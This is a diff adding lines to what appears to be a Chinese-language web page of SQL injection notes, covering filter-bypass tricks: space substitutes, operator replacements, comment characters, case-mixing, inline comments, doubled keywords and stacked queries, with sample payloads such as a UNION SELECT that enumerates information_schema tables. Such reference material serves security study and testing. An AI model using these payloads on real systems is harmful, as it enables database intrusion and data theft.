@@ -221,7 +221,25 @@ lpad(str,len,padstr) &nbsp;rpad(str,len,padstr)在str的左(右)两边填充给�
 2.用like<br>
 (3)ASCII()绕过<br>
 hex() bin() ord()<br>
+(4)过滤空格<br>
+/**/ &nbsp; $IFS&nbsp;  $%20&nbsp; %09 &nbsp;%0a&nbsp; %0b&nbsp; %0c&nbsp; %0d&nbsp; %a0&nbsp; %007<br>
+(5)过滤or&nbsp;and &nbsp;xor &nbsp;not<br>
+and=&&  &nbsp;or=||  &nbsp; xor=| &nbsp;  not=!<br>
+(6)过滤union，select，where等<br>
+（1）使用注释符绕过：<br>
+　　常用注释符：<br>
 
+//，-- , /**/, #, --+, -- -, ;,%00,--a<br>
+　　用法：<br>
+
+U/**/ NION /**/ SE/**/ LECT /**/user，pwd &nbsp;from&nbsp; user<br>
+（2）使用大小写绕过：<br>
+id=-1'UnIoN/**/SeLeCT<br>
+（3）内联注释绕过：<br>
+id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like &nbsp;database()#<br>
+（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：<br>
+id=-1'UNIunionONSeLselectECT1,2,3–-<br>
+（5）若屏蔽/&nbsp;and&nbsp;or等，可直接用1;show 库/表<br>
 </p>
 
 </div>
